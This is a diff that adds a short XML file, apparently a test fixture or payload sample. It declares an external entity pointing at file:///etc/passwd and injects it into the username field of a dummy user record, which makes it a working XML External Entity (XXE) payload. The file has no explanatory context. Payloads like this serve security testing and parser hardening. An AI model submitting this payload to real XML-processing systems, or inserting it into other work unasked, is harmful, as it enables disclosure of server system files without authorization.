@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<users>
+    <user>
+        <username>&xxe;</username>
+        <email>test@test.com</email>
+        <firstname>Test</firstname>
+        <lastname>User</lastname>
+        <password>123456</password>
+        <is_admin>false</is_admin>
+    </user>
+</users>
